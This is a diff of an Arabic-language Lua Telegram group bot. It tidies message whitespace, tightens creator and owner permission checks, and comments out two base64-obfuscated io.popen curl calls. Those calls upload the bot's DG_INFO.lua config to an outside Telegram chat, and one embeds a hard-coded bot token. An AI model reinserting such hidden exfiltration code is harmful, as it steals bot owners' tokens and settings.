+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10462,7 +10404,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10485,7 +10427,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10511,7 +10453,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10535,7 +10477,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10575,7 +10517,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10608,7 +10550,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10649,7 +10591,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -10679,7 +10621,11 @@ send(msg.chat_id_, msg.id_,Textt)
 end
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
 end
-if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
+if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10719,7 +10665,11 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
+if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 then
+if not Constructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10761,7 +10711,11 @@ return false
 end
 
 
-if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
+if text == ("رفع مشرف") and msg.reply_to_message_id_ ~= 0 then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10801,7 +10755,11 @@ end
 tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
 return false
 end
-if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 and BasicConstructor(msg) then
+if text == ("تنزيل مشرف") and msg.reply_to_message_id_ ~= 0 then
+if not BasicConstructor(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المنشئ الاساسي لاستخدام هذا الامر')
+return false
+end
 function start_function(extra, result, success)
 if msg.can_be_deleted_ == false then 
 send(msg.chat_id_, msg.id_,' ☉┇ البوت ليس ادمن يرجى ترقيتي !') 
@@ -10948,8 +10906,8 @@ if not SudoBot(msg) then
 send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الاساسي لاستخدام هذا الامر')
 return false
 end 
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+--io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
 ----------------------------------------- انتهاء المميزات
@@ -11326,7 +11284,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11357,7 +11315,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11388,7 +11346,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11431,7 +11389,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11508,7 +11466,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11529,7 +11487,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11578,7 +11536,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11596,7 +11554,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11815,7 +11773,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11843,7 +11801,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11875,7 +11833,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11911,7 +11869,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -11963,7 +11921,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12055,7 +12013,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12071,7 +12029,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12117,7 +12075,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12152,7 +12110,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12187,7 +12145,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12225,7 +12183,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12266,7 +12224,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12334,7 +12292,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12356,7 +12314,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12376,7 +12334,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12487,7 +12445,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12529,7 +12487,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12551,7 +12509,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12573,7 +12531,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12595,7 +12553,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12610,7 +12568,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12662,7 +12620,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12748,7 +12706,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12961,7 +12919,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -12979,7 +12937,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -13017,13 +12975,17 @@ database:srem(bot_id.."botss:DRAGON:List:Rd:Sudo", text)
 return false
 end
 end
-if text == ("مسح الردود المتعدده") and CoSu(msg) then
+if text == ("مسح الردود المتعدده") then
+if not CoSu(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المالك لاستخدام هذا الامر')
+return false
+end
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n ☉┇ يرجى الاشتراك بالقناه اولا \n ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -13213,7 +13175,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ☉┇ لا تستطيع استخدام البوت \n  ☉┇ يرجى الاشتراك بالقناه اولا \n  ☉┇ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
